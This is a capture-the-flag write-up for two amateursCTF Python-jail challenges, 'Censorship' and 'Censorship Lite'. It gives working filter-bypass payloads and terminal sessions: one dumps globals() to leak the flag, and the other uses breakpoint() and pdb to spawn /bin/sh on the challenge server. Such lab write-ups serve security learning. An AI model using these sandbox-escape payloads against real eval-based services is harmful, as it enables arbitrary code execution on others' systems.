# Censorship

## Censorship

### Description

by `hellopir2 and flocto`

I'll let you run anything on my python program as long as you don't try to print the flag or violate any of my other rules! Pesky CTFers...

Connect: `nc amt.rs 31670`  
Downloads: [main.py](https://amateurs-prod.storage.googleapis.com/uploads/3f441bb5364bdc3c29bf52aa2dd4033b915b5f4c72b98416b395ddf15c3051ee/main.py)

### Analysis

Program only allows ascii characters.
```python
code = ascii(input("Give code: "))
```

Filter is `flag`, `e`, `t` and `\` (to filter non ascii). 
```python
if "flag" in code or "e" in code or "t" in code or "\\" in code:
```

We need to somehow get flag, since it's defined we can get it from `locals()` or `globals()`.  

The problem is `exec`, because to get output we need something like `print(locals())`, but `t` is filtered and hence payload doesn't work.

```python
➜ python
Python 3.9.5 (tags/v3.9.5:0a7dcbd, May  3 2021, 17:27:52) [MSC v.1928 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> from flag import flag
>>> _ = flag
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'flag': 'fakeCTF{fake_flag}', '_': 'fakeCTF{fake_flag}'}
>>> dir()
['_', '__annotations__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'flag']
>>> globals()[dir()[2]]
<module 'builtins' (built-in)>
>>> globals()[dir()[2]].__dir__()[40]
'print'
>>> vars(globals()[dir()[2]])
... # Outputs {function_name: function} Dictionary
>>> vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[40]]
<built-in function print>
>>> vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[40]](globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'flag': 'fakeCTF{fake_flag}', '_': 'fakeCTF{fake_flag}'}
```

In short payload calls `__builtins__` as a dict and we access `print` function from `__dir__` (since `t` is filtered) and finally pass `globals()` to print.

### Solution

```bash
➜ ncat amt.rs 31670
Give code: vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[40]](globals())
ord() expected string of length 1, but dict found
Give code: vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fae52883c10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/app/run', '__cached__': None, 'flag': 'amateursCTF{i_l0v3_overwr1t1nG_functions..:D}', '_': 'amateursCTF{i_l0v3_overwr1t1nG_functions..:D}', 'code': "'vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())'"}
Give code:
```

::: tip Flag
`amateursCTF{i_l0v3_overwr1t1nG_functions..:D}`
:::

::: info
`print` function on server was located at index 42
:::

## Censorship Lite

### Description

by `hellopir2 and flocto`

There was clearly not enough censorship last time. This time it's lite™. I'm afraid now you'll never get in to my system! Unfortunate for those pesky CTFers. Better social engineer an admin for the flag!!!!

`nc amt.rs 31671`

Downloads: [main.py](https://amateurs-prod.storage.googleapis.com/uploads/9a5f6a99e002e7a5209df63a34e5fdc426bc69ad8ba8addfd3a7f64797cf78be/main.py)

### Analysis

Code: 
```python
#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "\lite0123456789"]):
                raise ValueError("invalid input")
            exec(eval(code))
        except Exception as err:
            print(err)
```

In this challenge we are restricted to numbers, chars: `[l, i, t, e]` and double quotes `"`.

First I replicated challenge with more verbosity and started testing: 
```python
def bypass(code):
    good = True
    for c in "\lite0123456789":
        if c in code:
            print(f"{c} Found In Code! Busted!")
            good = False

    return good

while True:
    code = ascii(input('> Code: '))
    if bypass(code):
        try:
            print('< Code:', code)
            print('< Eval: %s | %s' % (eval(code), eval(eval(code))))
            print('< Exec:', exec(eval(code)))
        except Exception as e:
            print(f"{'-'*20}\n{e}\n{'-'*20}")
```

We are restricted to most functions and the only (useful) function I found to work is `vars()`.
```python
# "vars" returns dictionary which we need to use, but first we need key
>>> vars()  
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>}
>>> [*vars()] # Unpack dictionary keys into list and get list!
['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__annotations__', '__builtins__']
>>> [*vars()][-1] # Access last variable
'__builtins__'
>>> [*vars()][ord('A')-ord('B')] # We need to be sneaky, because digits aren't allowed
'__builtins__'
>>> vars()[[*vars()][ord('A')-ord('B')]] # Access dictionary by key
<module 'builtins' (built-in)>
# A bit of a giant leap here, but in short 
# turn `builtins` into list of keys and get key
# In this case I'll be using `breakpoint` cause I thought it would be fun
>>> [*vars(vars()[[*vars()][ord('A')-ord('B')]])][ord('M')-ord('A')]
'breakpoint'
# Assemble payload... god its long... D:
>>> vars(vars()[[*vars()][ord('A')-ord('B')]])[[*vars(vars()[[*vars()][ord('A')-ord('B')]])][ord('M')-ord('A')]]
<built-in function breakpoint>
# Add parenthesis at the end and boom! inside PDB (Python Debugger)
>>> vars(vars()[[*vars()][ord('A')-ord('B')]])[[*vars(vars()[[*vars()][ord('A')-ord('B')]])][ord('M')-ord('A')]]()
--Return--
> <stdin>(1)<module>()->None
(Pdb) import os
(Pdb) os.system('cmd') # I'm on windows 0w0
Microsoft Windows [Version 10.0.19045.3208]
(c) Microsoft Corporation. All rights reserved.

C:\..\Temp> echo Hello!
Hello!
``` 

### Solution 

```bash
➜ ncat amt.rs 31671
Give code: vars(vars()[[*vars()][ord('A')-ord('G')]])[[*vars(vars()[[*vars()][ord('A')-ord('G')]])][ord('M')-ord('A')]]()
--Return--
> <string>(1)<module>()->None
(Pdb) __import__('os').system('/bin/sh')
id
uid=1000 gid=1000 groups=1000
ls
flag.py
run
cat flag.py
flag = "amateursCTF{sh0uld'v3_r3strict3D_p4r3nTh3ticaLs_1nst3aD}"
```

::: tip Flag
`amateursCTF{sh0uld'v3_r3strict3D_p4r3nTh3ticaLs_1nst3aD}`
:::

::: info
`builtins` function on server was located at index `ord('A')-ord('G') => -6`
:::